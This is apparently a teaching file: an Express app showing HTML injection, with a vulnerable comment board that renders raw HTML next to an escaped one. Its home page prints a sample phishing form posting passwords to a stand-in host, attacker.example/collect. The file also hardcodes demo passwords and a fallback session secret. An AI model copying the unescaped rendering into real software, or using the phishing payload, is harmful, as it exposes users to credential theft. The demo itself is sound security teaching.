// app.js - HTML Injection demonstration
// Dependencies: express, express-session, bcryptjs
// Install: npm install express express-session bcryptjs

const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');

const app = express();

// ---------- In-memory comment stores ----------
// Two separate arrays so vulnerable and safe demos don't share state.
const vulnerableComments = [];
const safeComments = [];

// ---------- Middleware ----------
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ---------- Sessions ----------
app.use(
  session({
    name: 'sid',
    secret: process.env.SESSION_SECRET || 'change-this-session-secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      sameSite: 'lax',
      // secure: true, // enable when serving over HTTPS
      maxAge: 1000 * 60 * 60
    }
  })
);

// ---------- In-memory users for session auth ----------
const seedUsers = [
  { username: 'alice', password: 'password1', role: 'admin' },
  { username: 'bob',   password: 'password2', role: 'user'  }
];
const USERS = Object.fromEntries(
  seedUsers.map(u => [
    u.username,
    { username: u.username, role: u.role, passwordHash: bcrypt.hashSync(u.password, 10) }
  ])
);

// ---------- Helpers ----------
function requireAuth(req, res, next) {
  if (req.session?.user) return next();
  return res.status(401).send(`
    <h1>401 Unauthorized</h1>
    <p>You must <a href="/login">log in</a> to access this page.</p>
  `);
}

function requireRole(role) {
  return (req, res, next) => {
    if (req.session?.user?.role === role) return next();
    return res.status(403).send('<h1>403 Forbidden</h1><p>Insufficient permissions.</p>');
  };
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// ---------- Templates ----------
const nav = (user) => `
  <nav>
    <a href="/">Home</a> |
    <a href="/dashboard">Dashboard</a> |
    <a href="/admin">Admin</a> |
    <a href="/comments">Comments</a> |
    <a href="/comments-safe">Comments (Safe)</a> |
    <a href="/login">${user ? 'Switch user' : 'Login'}</a>
    ${user ? ' | <form style="display:inline" method="post" action="/logout"><button>Logout</button></form>' : ''}
  </nav>
  <hr>
`;

const page = (title, body, user) => `
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body>
  ${nav(user)}
  ${body}
</body>
</html>
`;

// ---------- Routes ----------
app.get('/', (req, res) => {
  const user = req.session.user;
  res.send(page('HTML Injection', `
    <h1>HTML Injection</h1>
    <p>HTML injection occurs when user-supplied input is rendered directly into an HTML page without escaping. Unlike Cross-Site Scripting (XSS), which relies on JavaScript execution, HTML injection works by inserting arbitrary HTML elements — headings, forms, images, iframes — that change the structure or apparent content of the page. This makes it effective even when a Content Security Policy blocks inline scripts, because no JavaScript is needed.</p>
    <p>The most impactful HTML injection attack is <strong>phishing form injection</strong>: an attacker posts a comment containing a <code>&lt;form&gt;</code> element whose <code>action</code> attribute points to an attacker-controlled server. To a victim viewing the page, the injected form appears to be part of the legitimate site. When they submit it, their input goes to the attacker. This example uses a comment board to demonstrate the attack: the vulnerable board at <a href="/comments">/comments</a> renders comment text as raw HTML; the safe board at <a href="/comments-safe">/comments-safe</a> HTML-escapes all user content before rendering.</p>

    <h2>How This App Works</h2>
    <p>Two comment boards share the same form and display layout but differ only in how comment text is output. The vulnerable board interpolates <code>c.text</code> directly into the HTML string; the safe board wraps every user-supplied value in <code>escapeHtml()</code>, converting <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>, and <code>&amp;</code> into their HTML entity equivalents so they render as visible characters instead of markup.</p>

    <h2>The Attack</h2>
    <p>On the <a href="/comments">/comments</a> board, post the following as a comment:</p>
    <pre>&lt;h2 style="color:red"&gt;Security Notice&lt;/h2&gt;
&lt;p&gt;Your session has expired. Please verify your identity to continue:&lt;/p&gt;
&lt;form action="http://attacker.example/collect" method="post"&gt;
  &lt;input name="password" type="password" placeholder="Re-enter your password"
    style="width:280px"&gt;&lt;br&gt;&lt;br&gt;
  &lt;button type="submit" style="background:#007bff;color:#fff;padding:4px 12px"&gt;
    Verify Now
  &lt;/button&gt;
&lt;/form&gt;</pre>
    <p>Any user who views the comments page sees what appears to be an official session-expiry prompt. The form submits to the attacker's server, not the real application.</p>

    <h2>Try It</h2>
    <ul>
      <li>Log in as <code>alice / password1</code> (admin) or <code>bob / password2</code> (user)</li>
      <li>Visit <a href="/comments">/comments</a> and post a comment with plain text — works as expected</li>
      <li>Post a comment containing <code>&lt;b&gt;bold text&lt;/b&gt;</code> — the tag renders</li>
      <li>Post the phishing payload above — the injected form appears on the page as real content</li>
      <li>Visit <a href="/comments-safe">/comments-safe</a> and post the same payloads — all HTML tags are displayed as literal text</li>
    </ul>

    ${user ? `<p>Currently logged in as <strong>${user.username}</strong> (${user.role}).</p>` : '<p>You are not logged in.</p>'}
  `, user));
});

app.get('/login', (req, res) => {
  const user = req.session.user;
  res.send(page('Login', `
    <h1>Login</h1>
    <form method="post" action="/login">
      <label for="username">Username</label><br>
      <input id="username" name="username" autocomplete="username" required><br><br>
      <label for="password">Password</label><br>
      <input id="password" name="password" type="password" autocomplete="current-password" required><br><br>
      <button type="submit">Sign in</button>
    </form>
    ${user ? `<p>Already logged in as <strong>${user.username}</strong>. <a href="/">Go home</a> or log out below.</p>` : ''}
  `, user));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  const record = USERS[username];
  if (!record || !bcrypt.compareSync(password, record.passwordHash)) {
    return res.status(401).send(page('Login failed', '<p>Invalid credentials.</p><p><a href="/login">Try again</a></p>'));
  }
  req.session.user = { username: record.username, role: record.role };
  res.redirect('/dashboard');
});

app.post('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/'));
});

app.get('/dashboard', requireAuth, (req, res) => {
  const user = req.session.user;
  res.send(page('Dashboard', `
    <h1>Dashboard</h1>
    <p>Welcome, <strong>${user.username}</strong>. Your role is <strong>${user.role}</strong>.</p>
    <p>This page is visible to any authenticated user.</p>
    <p><a href="/comments">Comments (vulnerable)</a> | <a href="/comments-safe">Comments (safe)</a></p>
  `, user));
});

app.get('/admin', requireAuth, requireRole('admin'), (req, res) => {
  const user = req.session.user;
  res.send(page('Admin', `
    <h1>Admin</h1>
    <p>Only admins can see this. Hello, <strong>${user.username}</strong>.</p>
  `, user));
});

app.get('/api/me', requireAuth, (req, res) => {
  res.json({ user: req.session.user, ok: true });
});

// ---------- Comments (vulnerable) ----------
const commentsForm = (comments, error, user) => page('Comments', `
  <h1>Comments</h1>
  <p>Post a comment. Comment text is rendered as raw HTML — tags are not escaped.</p>
  <form method="post" action="/comments">
    <label for="text">Comment</label><br>
    <textarea id="text" name="text" rows="4" style="width:500px"></textarea><br><br>
    <button type="submit">Post Comment</button>
  </form>
  ${error ? `<p style="color:red"><strong>Error:</strong> ${escapeHtml(error)}</p>` : ''}
  <hr>
  <h2>All Comments</h2>
  ${comments.length === 0 ? '<p>No comments yet.</p>' : comments.map(c => `
    <div style="border:1px solid #ccc;padding:8px;margin:8px 0">
      <strong>${escapeHtml(c.username)}</strong>: ${c.text}
    </div>
  `).join('')}
`, user);

app.get('/comments', requireAuth, (req, res) => {
  res.send(commentsForm(vulnerableComments, '', req.session.user));
});

app.post('/comments', requireAuth, (req, res) => {
  const { text } = req.body || {};
  if (!text || !text.trim()) {
    return res.send(commentsForm(vulnerableComments, 'Comment cannot be empty.', req.session.user));
  }
  // VULNERABLE: comment text stored and rendered without HTML escaping.
  // Any HTML tags in the comment are interpreted as markup by the browser.
  vulnerableComments.push({ username: req.session.user.username, text });
  res.redirect('/comments');
});

// ---------- Comments (safe) ----------
const commentsSafeForm = (comments, error, user) => page('Comments (Safe)', `
  <h1>Comments (Safe)</h1>
  <p>Post a comment. Comment text is HTML-escaped before rendering — tags display as literal text.</p>
  <form method="post" action="/comments-safe">
    <label for="text">Comment</label><br>
    <textarea id="text" name="text" rows="4" style="width:500px"></textarea><br><br>
    <button type="submit">Post Comment</button>
  </form>
  ${error ? `<p style="color:red"><strong>Error:</strong> ${escapeHtml(error)}</p>` : ''}
  <hr>
  <h2>All Comments</h2>
  ${comments.length === 0 ? '<p>No comments yet.</p>' : comments.map(c => `
    <div style="border:1px solid #ccc;padding:8px;margin:8px 0">
      <strong>${escapeHtml(c.username)}</strong>: ${escapeHtml(c.text)}
    </div>
  `).join('')}
`, user);

app.get('/comments-safe', requireAuth, (req, res) => {
  res.send(commentsSafeForm(safeComments, '', req.session.user));
});

app.post('/comments-safe', requireAuth, (req, res) => {
  const { text } = req.body || {};
  if (!text || !text.trim()) {
    return res.send(commentsSafeForm(safeComments, 'Comment cannot be empty.', req.session.user));
  }
  // Safe: text is stored raw and HTML-escaped at render time.
  // Escaping at render time (not store time) preserves the original data and
  // allows the same stored value to be safely used in different output contexts.
  safeComments.push({ username: req.session.user.username, text });
  res.redirect('/comments-safe');
});

// ---------- Start ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`App running at http://localhost:${PORT}`);
});
